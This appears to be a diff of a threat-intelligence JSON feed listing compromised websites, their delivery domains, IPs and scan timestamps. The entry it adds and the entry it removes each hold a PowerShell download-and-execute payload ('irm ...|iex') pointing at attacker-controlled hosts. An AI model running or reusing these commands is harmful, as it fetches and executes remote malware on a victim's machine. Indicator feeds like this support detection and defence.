@@ -1,5 +1,28 @@
 [
   {
+    "UrlDomain": "purebrookkitchens.com",
+    "DeliveryUrl": [
+      "lskannsserv.beer",
+      "browse-cloud.codes"
+    ],
+    "PayloadUrl": [],
+    "IP": [
+      "160.153.0.94"
+    ],
+    "Related": [
+      {
+        "Value": "https://browse-cloud.codes/7570b7171e7d3dd2",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "irm 'browse-cloud.codes/7570b7171e7d3dd2'|iex;",
+    "ResolvedDownloadUrl": [
+      "https://browse-cloud.codes/7570b7171e7d3dd2"
+    ],
+    "ReportId": "cmwmti3a11uip0omlvh5hjhr9",
+    "ScannedAt": "2026-11-19T00:34:13.487000+00:00"
+  },
+  {
     "UrlDomain": "amanialnukhtha.com",
     "DeliveryUrl": [],
     "PayloadUrl": [],
@@ -5668,24 +5691,5 @@
     ],
     "ReportId": "cmwk0b89t19c30oml69o3fcb7",
     "ScannedAt": "2026-11-17T01:21:32.121000+00:00"
-  },
-  {
-    "UrlDomain": "www.gsrunners.it",
-    "DeliveryUrl": [
-      "github.pw"
-    ],
-    "PayloadUrl": [
-      "https://github.pw/8pchkbdes5/167d3c85ee383e0e"
-    ],
-    "IP": [
-      "31.11.36.33"
-    ],
-    "Related": [],
-    "Payload": "(irm 'https://github[.]pw/8pchkbdes5/167d3c85ee383e0e')|iex",
-    "ResolvedDownloadUrl": [
-      "https://github.pw/8pchkbdes5/167d3c85ee383e0e"
-    ],
-    "ReportId": "cmwjyukd3198l0omlbovyvnwg",
-    "ScannedAt": "2026-11-17T00:40:35.020000+00:00"
   }
 ]
